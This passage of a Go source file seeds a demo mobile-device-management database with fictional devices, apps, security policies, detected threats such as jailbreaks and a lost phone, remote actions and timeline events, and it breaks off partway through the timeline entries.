func seedMDMEnterprise(db *sql.DB) {
	const tid = "9999"
	now := time.Now()

	for _, s := range []string{
		`CREATE TABLE IF NOT EXISTS mdme_devices (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, device_id TEXT NOT NULL,
			device_name TEXT NOT NULL, device_type TEXT NOT NULL DEFAULT 'smartphone',
			platform TEXT NOT NULL DEFAULT 'android', manufacturer TEXT, model TEXT,
			serial_number TEXT, imei TEXT, os_version TEXT, security_patch TEXT,
			owner TEXT, owner_email TEXT, department TEXT, business_unit TEXT,
			enrollment_status TEXT NOT NULL DEFAULT 'enrolled',
			compliance_status TEXT NOT NULL DEFAULT 'compliant',
			risk_score INTEGER DEFAULT 0, battery_level INTEGER DEFAULT 0,
			storage_total_gb FLOAT DEFAULT 0, storage_used_gb FLOAT DEFAULT 0,
			memory_total_gb FLOAT DEFAULT 0, memory_used_gb FLOAT DEFAULT 0,
			wifi_ssid TEXT, wifi_signal_pct INTEGER DEFAULT 0, cellular_carrier TEXT,
			cellular_signal_pct INTEGER DEFAULT 0, bluetooth_enabled BOOLEAN DEFAULT FALSE,
			gps_lat FLOAT DEFAULT 0, gps_lon FLOAT DEFAULT 0, gps_location TEXT,
			encryption_enabled BOOLEAN DEFAULT TRUE, rooted BOOLEAN DEFAULT FALSE,
			jailbroken BOOLEAN DEFAULT FALSE, screen_lock_enabled BOOLEAN DEFAULT TRUE,
			screen_lock_timeout_min INTEGER DEFAULT 5, biometric_enabled BOOLEAN DEFAULT FALSE,
			is_lost BOOLEAN DEFAULT FALSE, is_quarantined BOOLEAN DEFAULT FALSE,
			last_checkin_at TIMESTAMP, enrolled_at TIMESTAMP DEFAULT NOW(),
			created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW(),
			UNIQUE(tenant_id, device_id))`,
		`CREATE TABLE IF NOT EXISTS mdme_apps (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, device_id TEXT NOT NULL,
			app_id TEXT NOT NULL, app_name TEXT NOT NULL, bundle_id TEXT, version TEXT,
			vendor TEXT, category TEXT DEFAULT 'other', status TEXT DEFAULT 'approved',
			size_mb FLOAT DEFAULT 0, install_source TEXT DEFAULT 'user',
			managed BOOLEAN DEFAULT FALSE, last_used_at TIMESTAMP,
			installed_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS mdme_policies (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, policy_id TEXT NOT NULL UNIQUE,
			name TEXT NOT NULL, policy_type TEXT NOT NULL DEFAULT 'security',
			platform TEXT NOT NULL DEFAULT 'all', enabled BOOLEAN DEFAULT TRUE,
			priority INTEGER DEFAULT 5, min_os_version TEXT,
			require_encryption BOOLEAN DEFAULT TRUE, require_screen_lock BOOLEAN DEFAULT TRUE,
			screen_lock_timeout INTEGER DEFAULT 5, require_biometric BOOLEAN DEFAULT FALSE,
			block_camera BOOLEAN DEFAULT FALSE, block_usb BOOLEAN DEFAULT FALSE,
			block_bluetooth BOOLEAN DEFAULT FALSE, require_vpn BOOLEAN DEFAULT FALSE,
			wifi_allowlist TEXT DEFAULT '[]', min_password_length INTEGER DEFAULT 8,
			require_complex_password BOOLEAN DEFAULT TRUE, max_failed_attempts INTEGER DEFAULT 10,
			devices_applied INTEGER DEFAULT 0, created_by TEXT NOT NULL,
			created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS mdme_threats (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, threat_id TEXT NOT NULL UNIQUE,
			device_id TEXT NOT NULL, device_name TEXT, threat_type TEXT NOT NULL,
			title TEXT NOT NULL, description TEXT, severity TEXT NOT NULL DEFAULT 'medium',
			status TEXT NOT NULL DEFAULT 'open', detected_at TIMESTAMP DEFAULT NOW(),
			resolved_at TIMESTAMP, resolved_by TEXT)`,
		`CREATE TABLE IF NOT EXISTS mdme_remote_actions (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, action_id TEXT NOT NULL UNIQUE,
			device_id TEXT NOT NULL, device_name TEXT, action_type TEXT NOT NULL,
			status TEXT NOT NULL DEFAULT 'pending', initiated_by TEXT NOT NULL,
			completed_at TIMESTAMP, result TEXT, created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS mdme_timeline (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, device_id TEXT NOT NULL,
			event_type TEXT NOT NULL, summary TEXT NOT NULL, actor TEXT,
			severity TEXT DEFAULT 'info', details TEXT, created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS mdme_reports (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, report_id TEXT NOT NULL UNIQUE,
			title TEXT NOT NULL, report_type TEXT NOT NULL, generated_by TEXT NOT NULL,
			format TEXT DEFAULT 'pdf', size_bytes BIGINT DEFAULT 0,
			device_count INTEGER DEFAULT 0, created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS mdme_notifications (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, event_type TEXT NOT NULL,
			title TEXT NOT NULL, message TEXT NOT NULL, severity TEXT NOT NULL DEFAULT 'info',
			device_id TEXT, read BOOLEAN DEFAULT FALSE, created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS mdme_audit (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, action TEXT NOT NULL,
			object_type TEXT NOT NULL, object_id TEXT, object_name TEXT,
			actor TEXT NOT NULL, ip_address TEXT, details TEXT, created_at TIMESTAMP DEFAULT NOW())`,
	} {
		db.Exec(s)
	}

	// ── Devices ───────────────────────────────────────────────────────────────

	type mdmDev struct {
		deviceID, name, dtype, platform, manufacturer, model string
		serial, imei, osVersion, patch, owner, email, dept, bu string
		enrollStatus, compStatus string
		risk, battery int
		storTotal, storUsed, memTotal, memUsed float64
		wifiSSID, carrier, gpsLoc string
		wifiSig, cellSig, lockTimeout int
		bt, enc, rooted, jailb, lock, bio, lost, quar bool
		lastCheckinMins, enrolledDaysAgo int
	}

	devices := []mdmDev{
		// iOS Corporate
		{
			deviceID: "MDME-IOS-001", name: "iPhone-EXEC-CEO", dtype: "smartphone", platform: "ios",
			manufacturer: "Apple", model: "iPhone 15 Pro Max", serial: "F4GT7H8J9K0L",
			imei: "352819110123456", osVersion: "17.4.1", patch: "2024-04-01",
			owner: "ceo@corp.local", email: "ceo@corp.local", dept: "Executive", bu: "Executive",
			enrollStatus: "enrolled", compStatus: "compliant", risk: 22, battery: 78,
			storTotal: 256, storUsed: 94, memTotal: 8, memUsed: 4.2,
			wifiSSID: "CORP-WIFI-EXEC", carrier: "Verizon", gpsLoc: "New York, NY",
			wifiSig: 92, cellSig: 85, lockTimeout: 1,
			bt: true, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: false, quar: false,
			lastCheckinMins: 5, enrolledDaysAgo: 365,
		},
		{
			deviceID: "MDME-IOS-002", name: "iPhone-FIN-047", dtype: "smartphone", platform: "ios",
			manufacturer: "Apple", model: "iPhone 15", serial: "G5HU8I9J0K1M",
			imei: "352819110234567", osVersion: "17.3.1", patch: "2024-03-15",
			owner: "john.smith", email: "john.smith@corp.local", dept: "Finance", bu: "Finance",
			enrollStatus: "enrolled", compStatus: "compliant", risk: 31, battery: 54,
			storTotal: 128, storUsed: 67, memTotal: 6, memUsed: 3.1,
			wifiSSID: "CORP-WIFI-FLOOR3", carrier: "AT&T", gpsLoc: "New York, NY",
			wifiSig: 76, cellSig: 72, lockTimeout: 2,
			bt: false, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: false, quar: false,
			lastCheckinMins: 12, enrolledDaysAgo: 280,
		},
		{
			deviceID: "MDME-IOS-003", name: "iPhone-DEV-112", dtype: "smartphone", platform: "ios",
			manufacturer: "Apple", model: "iPhone 14 Pro", serial: "H6IV9J0K1L2N",
			imei: "352819110345678", osVersion: "17.4.1", patch: "2024-04-01",
			owner: "alex.chen", email: "alex.chen@corp.local", dept: "Engineering", bu: "Engineering",
			enrollStatus: "enrolled", compStatus: "compliant", risk: 18, battery: 91,
			storTotal: 256, storUsed: 112, memTotal: 6, memUsed: 2.8,
			wifiSSID: "CORP-WIFI-FLOOR4", carrier: "T-Mobile", gpsLoc: "New York, NY",
			wifiSig: 88, cellSig: 79, lockTimeout: 5,
			bt: true, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: false, quar: false,
			lastCheckinMins: 3, enrolledDaysAgo: 90,
		},
		{
			deviceID: "MDME-IOS-004", name: "iPad-FIELD-024", dtype: "tablet", platform: "ios",
			manufacturer: "Apple", model: "iPad Pro 12.9 M4", serial: "I7JW0K1L2M3O",
			imei: "", osVersion: "17.4", patch: "2024-03-30",
			owner: "sales.rep.24", email: "sales.rep.24@corp.local", dept: "Sales", bu: "Sales",
			enrollStatus: "enrolled", compStatus: "compliant", risk: 24, battery: 38,
			storTotal: 512, storUsed: 187, memTotal: 16, memUsed: 6.4,
			wifiSSID: "", carrier: "Verizon", gpsLoc: "Chicago, IL",
			wifiSig: 0, cellSig: 68, lockTimeout: 3,
			bt: true, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: false, quar: false,
			lastCheckinMins: 47, enrolledDaysAgo: 200,
		},
		// Jailbroken / Risky iOS
		{
			deviceID: "MDME-IOS-005", name: "iPhone-HR-JAILBROKEN", dtype: "smartphone", platform: "ios",
			manufacturer: "Apple", model: "iPhone 13", serial: "J8KX1L2M3N4P",
			imei: "352819110456789", osVersion: "16.7.5", patch: "2023-12-01",
			owner: "unknown.hr", email: "temp.contractor@corp.local", dept: "HR", bu: "HR",
			enrollStatus: "enrolled", compStatus: "non_compliant", risk: 94, battery: 23,
			storTotal: 64, storUsed: 58, memTotal: 4, memUsed: 3.7,
			wifiSSID: "unknown-network", carrier: "Sprint", gpsLoc: "Unknown",
			wifiSig: 41, cellSig: 33, lockTimeout: 30,
			bt: true, enc: false, rooted: false, jailb: true, lock: false, bio: false, lost: false, quar: true,
			lastCheckinMins: 1440, enrolledDaysAgo: 60,
		},
		// Android Corporate
		{
			deviceID: "MDME-AND-001", name: "Pixel-IT-Admin-001", dtype: "smartphone", platform: "android",
			manufacturer: "Google", model: "Pixel 8 Pro", serial: "K9LY2M3N4O5Q",
			imei: "490154203237518", osVersion: "14", patch: "2024-04-05",
			owner: "carol.kim", email: "carol.kim@corp.local", dept: "IT", bu: "IT",
			enrollStatus: "enrolled", compStatus: "compliant", risk: 14, battery: 82,
			storTotal: 256, storUsed: 88, memTotal: 12, memUsed: 5.1,
			wifiSSID: "CORP-WIFI-IT", carrier: "Google Fi", gpsLoc: "New York, NY",
			wifiSig: 95, cellSig: 91, lockTimeout: 2,
			bt: true, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: false, quar: false,
			lastCheckinMins: 2, enrolledDaysAgo: 180,
		},
		{
			deviceID: "MDME-AND-002", name: "Samsung-SOC-Analyst", dtype: "smartphone", platform: "android",
			manufacturer: "Samsung", model: "Galaxy S24 Ultra", serial: "L0MZ3N4O5P6R",
			imei: "490154203348619", osVersion: "14", patch: "2024-03-20",
			owner: "alice.zhang", email: "alice.zhang@corp.local", dept: "Security", bu: "IT Security",
			enrollStatus: "enrolled", compStatus: "compliant", risk: 19, battery: 67,
			storTotal: 512, storUsed: 134, memTotal: 12, memUsed: 6.8,
			wifiSSID: "CORP-WIFI-SOC", carrier: "AT&T", gpsLoc: "New York, NY",
			wifiSig: 84, cellSig: 76, lockTimeout: 2,
			bt: false, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: false, quar: false,
			lastCheckinMins: 8, enrolledDaysAgo: 240,
		},
		{
			deviceID: "MDME-AND-003", name: "Android-BYOD-MktManager", dtype: "smartphone", platform: "android",
			manufacturer: "Samsung", model: "Galaxy S23", serial: "M1NA4O5P6Q7S",
			imei: "490154203459720", osVersion: "13", patch: "2024-01-05",
			owner: "marcus.lee", email: "marcus.lee@corp.local", dept: "Marketing", bu: "Marketing",
			enrollStatus: "enrolled", compStatus: "non_compliant", risk: 58, battery: 44,
			storTotal: 256, storUsed: 198, memTotal: 8, memUsed: 6.2,
			wifiSSID: "HOME-WIFI-5G", carrier: "T-Mobile", gpsLoc: "Brooklyn, NY",
			wifiSig: 67, cellSig: 54, lockTimeout: 10,
			bt: true, enc: true, rooted: false, jailb: false, lock: true, bio: false, lost: false, quar: false,
			lastCheckinMins: 720, enrolledDaysAgo: 150,
		},
		{
			deviceID: "MDME-AND-004", name: "Android-ROOTED-THREAT", dtype: "smartphone", platform: "android",
			manufacturer: "OnePlus", model: "OnePlus 12", serial: "N2OB5P6Q7R8T",
			imei: "490154203560821", osVersion: "14", patch: "2024-02-10",
			owner: "temp.contractor.02", email: "temp02@contractor.corp", dept: "Operations", bu: "Ops",
			enrollStatus: "enrolled", compStatus: "non_compliant", risk: 97, battery: 71,
			storTotal: 256, storUsed: 143, memTotal: 16, memUsed: 9.3,
			wifiSSID: "Starbucks Free WiFi", carrier: "Verizon", gpsLoc: "Times Square, NY",
			wifiSig: 45, cellSig: 62, lockTimeout: 60,
			bt: true, enc: false, rooted: true, jailb: false, lock: false, bio: false, lost: false, quar: true,
			lastCheckinMins: 2880, enrolledDaysAgo: 30,
		},
		// Windows Mobile
		{
			deviceID: "MDME-WIN-001", name: "Surface-Pro-FIN-Dir", dtype: "tablet", platform: "windows",
			manufacturer: "Microsoft", model: "Surface Pro 10", serial: "O3PC6Q7R8S9U",
			imei: "", osVersion: "Windows 11 23H2", patch: "2024-04-09",
			owner: "finance.director", email: "fin.dir@corp.local", dept: "Finance", bu: "Finance",
			enrollStatus: "enrolled", compStatus: "compliant", risk: 28, battery: 61,
			storTotal: 512, storUsed: 218, memTotal: 16, memUsed: 7.4,
			wifiSSID: "CORP-WIFI-FLOOR3", carrier: "", gpsLoc: "New York, NY",
			wifiSig: 88, cellSig: 0, lockTimeout: 5,
			bt: true, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: false, quar: false,
			lastCheckinMins: 18, enrolledDaysAgo: 320,
		},
		// Lost device
		{
			deviceID: "MDME-IOS-LOST", name: "iPhone-LOST-SALES", dtype: "smartphone", platform: "ios",
			manufacturer: "Apple", model: "iPhone 15", serial: "P4QD7R8S9T0V",
			imei: "352819110567890", osVersion: "17.2", patch: "2024-01-15",
			owner: "david.chen", email: "david.chen@corp.local", dept: "Sales", bu: "Sales",
			enrollStatus: "enrolled", compStatus: "non_compliant", risk: 88, battery: 11,
			storTotal: 128, storUsed: 44, memTotal: 6, memUsed: 2.1,
			wifiSSID: "", carrier: "AT&T", gpsLoc: "Last known: JFK Airport",
			wifiSig: 0, cellSig: 12, lockTimeout: 5,
			bt: false, enc: true, rooted: false, jailb: false, lock: true, bio: true, lost: true, quar: false,
			lastCheckinMins: 10080, enrolledDaysAgo: 200,
		},
	}

	for _, d := range devices {
		lc := now.Add(-time.Duration(d.lastCheckinMins) * time.Minute)
		ea := now.AddDate(0, 0, -d.enrolledDaysAgo)
		db.Exec(`INSERT INTO mdme_devices (
			tenant_id,device_id,device_name,device_type,platform,manufacturer,model,
			serial_number,imei,os_version,security_patch,owner,owner_email,department,business_unit,
			enrollment_status,compliance_status,risk_score,battery_level,
			storage_total_gb,storage_used_gb,memory_total_gb,memory_used_gb,
			wifi_ssid,wifi_signal_pct,cellular_carrier,cellular_signal_pct,
			bluetooth_enabled,gps_lat,gps_lon,gps_location,
			encryption_enabled,rooted,jailbroken,screen_lock_enabled,screen_lock_timeout_min,
			biometric_enabled,is_lost,is_quarantined,last_checkin_at,enrolled_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,
			$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34,$35,$36,$37,$38,$39,$40,$41)
			ON CONFLICT (tenant_id,device_id) DO NOTHING`,
			tid, d.deviceID, d.name, d.dtype, d.platform, d.manufacturer, d.model,
			exeNullStrSeed(d.serial), exeNullStrSeed(d.imei), exeNullStrSeed(d.osVersion), exeNullStrSeed(d.patch),
			exeNullStrSeed(d.owner), exeNullStrSeed(d.email), exeNullStrSeed(d.dept), exeNullStrSeed(d.bu),
			d.enrollStatus, d.compStatus, d.risk, d.battery,
			d.storTotal, d.storUsed, d.memTotal, d.memUsed,
			exeNullStrSeed(d.wifiSSID), d.wifiSig, exeNullStrSeed(d.carrier), d.cellSig,
			d.bt, 0.0, 0.0, exeNullStrSeed(d.gpsLoc),
			d.enc, d.rooted, d.jailb, d.lock, d.lockTimeout, d.bio, d.lost, d.quar,
			lc, ea,
		)
	}

	// ── Apps per device ───────────────────────────────────────────────────────

	type appRow struct{ devID, appID, name, bid, version, vendor, category, status string; sizeMB float64; managed bool }
	commonApps := []appRow{
		{"MDME-IOS-001", "APP-OUT", "Microsoft Outlook", "com.microsoft.Outlook", "4.2312.0", "Microsoft", "productivity", "approved", 184.2, true},
		{"MDME-IOS-001", "APP-TMS", "Microsoft Teams", "com.microsoft.skype.teams", "6.3.1", "Microsoft", "communication", "approved", 312.4, true},
		{"MDME-IOS-001", "APP-ZM", "Zoom", "us.zoom.videomeetings", "5.17.4", "Zoom", "communication", "approved", 98.6, false},
		{"MDME-IOS-001", "APP-1PW", "1Password", "com.agilebits.onepassword-ios-iforgot", "8.10.24", "AgileBits", "security", "approved", 66.1, true},
		{"MDME-IOS-001", "APP-ZSC", "Zscaler Client Connector", "com.zscaler.zscc", "4.3.0.186", "Zscaler", "security", "approved", 44.2, true},
		{"MDME-IOS-002", "APP-OUT", "Microsoft Outlook", "com.microsoft.Outlook", "4.2312.0", "Microsoft", "productivity", "approved", 184.2, true},
		{"MDME-IOS-002", "APP-TMS", "Microsoft Teams", "com.microsoft.skype.teams", "6.3.1", "Microsoft", "communication", "approved", 312.4, true},
		{"MDME-IOS-002", "APP-SF", "Salesforce", "com.salesforce.chatter", "242.0", "Salesforce", "productivity", "approved", 122.8, false},
		{"MDME-IOS-003", "APP-OUT", "Microsoft Outlook", "com.microsoft.Outlook", "4.2312.0", "Microsoft", "productivity", "approved", 184.2, true},
		{"MDME-IOS-003", "APP-GH", "GitHub", "com.github.stormbreaker.prod", "3.8.0", "GitHub", "productivity", "approved", 77.4, false},
		{"MDME-IOS-003", "APP-SLK", "Slack", "com.tinyspeck.chatlyio", "24.02.10", "Salesforce", "communication", "approved", 188.3, false},
		{"MDME-IOS-005", "APP-OUT", "Microsoft Outlook", "com.microsoft.Outlook", "4.2310.0", "Microsoft", "productivity", "approved", 184.2, true},
		{"MDME-IOS-005", "APP-TIK", "TikTok", "com.zhiliaoapp.musically", "34.1.0", "ByteDance", "other", "risky", 312.1, false},
		{"MDME-IOS-005", "APP-AV", "AppValley", "com.appvalley.store", "4.5.1", "AppValley", "other", "blocked", 8.2, false},
		{"MDME-AND-001", "APP-OUT", "Microsoft Outlook", "com.microsoft.intune.mam.managedbrowser", "4.2312.0", "Microsoft", "productivity", "approved", 201.3, true},
		{"MDME-AND-001", "APP-TMS", "Microsoft Teams", "com.microsoft.teams", "1.0.0.2024030503", "Microsoft", "communication", "approved", 188.4, true},
		{"MDME-AND-001", "APP-CS", "CrowdStrike Falcon", "com.crowdstrike.falcon", "7.3.0", "CrowdStrike", "security", "approved", 34.8, true},
		{"MDME-AND-002", "APP-OUT", "Microsoft Outlook", "com.microsoft.intune.mam.managedbrowser", "4.2312.0", "Microsoft", "productivity", "approved", 201.3, true},
		{"MDME-AND-002", "APP-CS", "CrowdStrike Falcon", "com.crowdstrike.falcon", "7.3.0", "CrowdStrike", "security", "approved", 34.8, true},
		{"MDME-AND-004", "APP-KN", "Kali NetHunter", "com.offsec.nethunter", "2024.1", "Offensive Security", "other", "blocked", 2048.0, false},
		{"MDME-AND-004", "APP-OUT", "Microsoft Outlook", "com.microsoft.intune.mam.managedbrowser", "4.2310.0", "Microsoft", "productivity", "approved", 201.3, false},
		{"MDME-WIN-001", "APP-OUT", "Microsoft Outlook", "Microsoft.Office.Outlook", "16.0.17231", "Microsoft", "productivity", "approved", 512.0, true},
		{"MDME-WIN-001", "APP-TMS", "Microsoft Teams", "MicrosoftTeams", "1.7.00.2024031401", "Microsoft", "communication", "approved", 388.0, true},
	}
	for _, a := range commonApps {
		db.Exec(`INSERT INTO mdme_apps (tenant_id,device_id,app_id,app_name,bundle_id,version,vendor,category,status,size_mb,managed,installed_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,NOW()-INTERVAL '30 days') ON CONFLICT DO NOTHING`,
			tid, a.devID, a.appID+"-"+a.devID, a.name, a.bid, a.version, a.vendor, a.category, a.status, a.sizeMB, a.managed)
	}

	// ── Policies ──────────────────────────────────────────────────────────────

	type policy struct {
		id, name, ptype, platform string
		enabled bool
		priority int
		minOS string
		reqEnc, reqLock bool
		lockTimeout int
		reqBio, blockCam, blockUSB, blockBT, reqVPN, reqComplex bool
		minPwdLen, maxFail, devApplied int
		createdBy string
	}
	policies := []policy{
		{
			id: "POL-BASE-001", name: "Baseline Security Policy", ptype: "security", platform: "all",
			enabled: true, priority: 1, minOS: "", reqEnc: true, reqLock: true, lockTimeout: 5,
			reqBio: false, blockCam: false, blockUSB: false, blockBT: false, reqVPN: false, reqComplex: true,
			minPwdLen: 8, maxFail: 10, devApplied: 427, createdBy: "carol.kim",
		},
		{
			id: "POL-IOS-001", name: "iOS Enhanced Security", ptype: "security", platform: "ios",
			enabled: true, priority: 2, minOS: "17.0", reqEnc: true, reqLock: true, lockTimeout: 2,
			reqBio: true, blockCam: false, blockUSB: false, blockBT: false, reqVPN: true, reqComplex: true,
			minPwdLen: 12, maxFail: 5, devApplied: 218, createdBy: "alice.zhang",
		},
		{
			id: "POL-AND-001", name: "Android Enterprise Policy", ptype: "security", platform: "android",
			enabled: true, priority: 2, minOS: "13", reqEnc: true, reqLock: true, lockTimeout: 3,
			reqBio: true, blockCam: false, blockUSB: true, blockBT: false, reqVPN: true, reqComplex: true,
			minPwdLen: 10, maxFail: 7, devApplied: 156, createdBy: "alice.zhang",
		},
		{
			id: "POL-EXEC-001", name: "Executive Device Policy", ptype: "security", platform: "ios",
			enabled: true, priority: 0, minOS: "17.2", reqEnc: true, reqLock: true, lockTimeout: 1,
			reqBio: true, blockCam: false, blockUSB: true, blockBT: false, reqVPN: true, reqComplex: true,
			minPwdLen: 16, maxFail: 3, devApplied: 8, createdBy: "ciso@corp.local",
		},
		{
			id: "POL-BYOD-001", name: "BYOD Container Policy", ptype: "privacy", platform: "android",
			enabled: true, priority: 3, minOS: "12", reqEnc: true, reqLock: true, lockTimeout: 5,
			reqBio: false, blockCam: false, blockUSB: false, blockBT: false, reqVPN: false, reqComplex: true,
			minPwdLen: 8, maxFail: 10, devApplied: 53, createdBy: "carol.kim",
		},
		{
			id: "POL-KIOSK-001", name: "Kiosk Mode Policy (Field Tablets)", ptype: "application", platform: "ios",
			enabled: true, priority: 4, minOS: "17.0", reqEnc: true, reqLock: true, lockTimeout: 1,
			reqBio: false, blockCam: true, blockUSB: true, blockBT: true, reqVPN: false, reqComplex: false,
			minPwdLen: 6, maxFail: 5, devApplied: 24, createdBy: "it-ops",
		},
	}
	for _, p := range policies {
		db.Exec(`INSERT INTO mdme_policies (tenant_id,policy_id,name,policy_type,platform,enabled,priority,
			min_os_version,require_encryption,require_screen_lock,screen_lock_timeout,require_biometric,
			block_camera,block_usb,block_bluetooth,require_vpn,min_password_length,
			require_complex_password,max_failed_attempts,devices_applied,created_by)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21)
			ON CONFLICT (policy_id) DO NOTHING`,
			tid, p.id, p.name, p.ptype, p.platform, p.enabled, p.priority,
			exeNullStrSeed(p.minOS), p.reqEnc, p.reqLock, p.lockTimeout, p.reqBio,
			p.blockCam, p.blockUSB, p.blockBT, p.reqVPN, p.minPwdLen,
			p.reqComplex, p.maxFail, p.devApplied, p.createdBy)
	}

	// ── Threats ───────────────────────────────────────────────────────────────

	type threat struct{ id, devID, dname, ttype, title, desc, severity, status string; minsAgo int }
	threats := []threat{
		{"MDME-THR-001", "MDME-IOS-005", "iPhone-HR-JAILBROKEN", "jailbreak", "Jailbreak Detected on HR Device",
			"Unc0ver jailbreak detected on iPhone 13 belonging to HR contractor. Device has Cydia installed and SSH enabled.", "critical", "open", 720},
		{"MDME-THR-002", "MDME-AND-004", "Android-ROOTED-THREAT", "root", "Root Access Detected — Kali NetHunter",
			"Device is rooted and running Kali NetHunter penetration testing suite. Unauthorized security tool.", "critical", "investigating", 2880},
		{"MDME-THR-003", "MDME-AND-004", "Android-ROOTED-THREAT", "malicious_app", "Malicious Application: Kali NetHunter",
			"Kali NetHunter is a penetration testing framework allowing network attacks from a mobile device. Corporate policy violation.", "critical", "investigating", 2880},
		{"MDME-THR-004", "MDME-AND-003", "Android-BYOD-MktManager", "unsafe_wifi", "Unsafe Wi-Fi Network Detected",
			"Device connected to open Wi-Fi network 'HOME-WIFI-5G' without VPN. Corporate data may be exposed to man-in-the-middle attacks.", "medium", "open", 720},
		{"MDME-THR-005", "MDME-IOS-005", "iPhone-HR-JAILBROKEN", "blocked_app", "Blocked Application Detected: AppValley",
			"AppValley sideloading store detected. Can install unsigned apps bypassing App Store security review. Device quarantined.", "high", "open", 720},
		{"MDME-THR-006", "MDME-IOS-LOST", "iPhone-LOST-SALES", "device_lost", "Device Reported Lost: iPhone-LOST-SALES",
			"Sales employee reported device lost at JFK Airport. Device has not checked in for 7 days. Remote wipe may be required.", "high", "investigating", 10080},
		{"MDME-THR-007", "MDME-AND-003", "Android-BYOD-MktManager", "policy_violation", "OS Version Below Minimum Policy",
			"Device running Android 13 which is below the required Android 14 minimum version. Security patches from 2024-01-05.", "medium", "open", 1440},
		{"MDME-THR-008", "MDME-IOS-002", "iPhone-FIN-047", "phishing_attempt", "Suspicious Link Clicked: Finance Phishing",
			"Zscaler detected click on known phishing URL targeting financial credentials. Request was blocked. User alerted.", "high", "resolved", 4320},
	}
	for _, t := range threats {
		det := now.Add(-time.Duration(t.minsAgo) * time.Minute)
		var resAt interface{} = nil
		var resBy interface{} = nil
		if t.status == "resolved" {
			rt := det.Add(2 * time.Hour)
			resAt = rt
			resBy = "alice.zhang"
		}
		db.Exec(`INSERT INTO mdme_threats (tenant_id,threat_id,device_id,device_name,threat_type,title,description,severity,status,detected_at,resolved_at,resolved_by)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12) ON CONFLICT (threat_id) DO NOTHING`,
			tid, t.id, t.devID, t.dname, t.ttype, t.title, t.desc, t.severity, t.status, det, resAt, resBy)
	}

	// ── Remote Actions ────────────────────────────────────────────────────────

	type action struct{ id, devID, dname, atype, status, by, result string; minsAgo int }
	actions := []action{
		{"MDME-ACT-001", "MDME-IOS-005", "iPhone-HR-JAILBROKEN", "quarantine", "completed", "alice.zhang", "Device quarantined successfully", 718},
		{"MDME-ACT-002", "MDME-AND-004", "Android-ROOTED-THREAT", "quarantine", "completed", "carol.kim", "Device quarantined and isolated from corporate resources", 2877},
		{"MDME-ACT-003", "MDME-IOS-LOST", "iPhone-LOST-SALES", "locate", "completed", "carol.kim", "Last location: JFK Terminal 4 (2024-03-31 14:22 UTC)", 10075},
		{"MDME-ACT-004", "MDME-IOS-LOST", "iPhone-LOST-SALES", "lock", "completed", "carol.kim", "Device locked with passcode and recovery message displayed", 10070},
		{"MDME-ACT-005", "MDME-IOS-LOST", "iPhone-LOST-SALES", "play_sound", "completed", "carol.kim", "Sound activated for 2 minutes", 10065},
		{"MDME-ACT-006", "MDME-AND-003", "Android-BYOD-MktManager", "sync_policies", "completed", "system", "All 3 applicable policies synced successfully", 1438},
		{"MDME-ACT-007", "MDME-IOS-001", "iPhone-EXEC-CEO", "compliance_check", "completed", "carol.kim", "All compliance checks passed (8/8)", 240},
		{"MDME-ACT-008", "MDME-AND-001", "Pixel-IT-Admin-001", "collect_logs", "completed", "alice.zhang", "Logs collected: 47MB, forwarded to SIEM", 480},
		{"MDME-ACT-009", "MDME-IOS-005", "iPhone-HR-JAILBROKEN", "wipe_corporate", "pending", "security-team", "", 5},
		{"MDME-ACT-010", "MDME-AND-002", "Samsung-SOC-Analyst", "sync_policies", "completed", "system", "Policy sync completed, 1 new policy applied", 720},
	}
	for _, a := range actions {
		t := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		var compAt interface{} = nil
		if a.status == "completed" {
			ct := t.Add(3 * time.Minute)
			compAt = ct
		}
		db.Exec(`INSERT INTO mdme_remote_actions (tenant_id,action_id,device_id,device_name,action_type,status,initiated_by,result,completed_at,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) ON CONFLICT (action_id) DO NOTHING`,
			tid, a.id, a.devID, a.dname, a.atype, a.status, a.by, exeNullStrSeed(a.result), compAt, t)
	}

	// ── Timeline ──────────────────────────────────────────────────────────────

	type tlev struct{ devID, etype, summary, actor, severity, details string; minsAgo int }
	tlEvents := []tlev{
		{"MDME-IOS-005", "threat_detected", "Jailbreak detected by compliance engine", "MDM Compliance Engine", "critical", "Unc0ver jailbreak, Cydia package manager, SSH enabled", 720},
		{"MDME-IOS-005", "quarantine", "Device quarantined by security team", "alice.zhang", "high", "All corporate resources revoked pending investigation", 718},
		{"MDME-IOS-005", "app_detected", "Blocked app AppValley detected and flagged", "App Control Engine", "high", "Sideloading store — can install unsigned IPA files", 716},
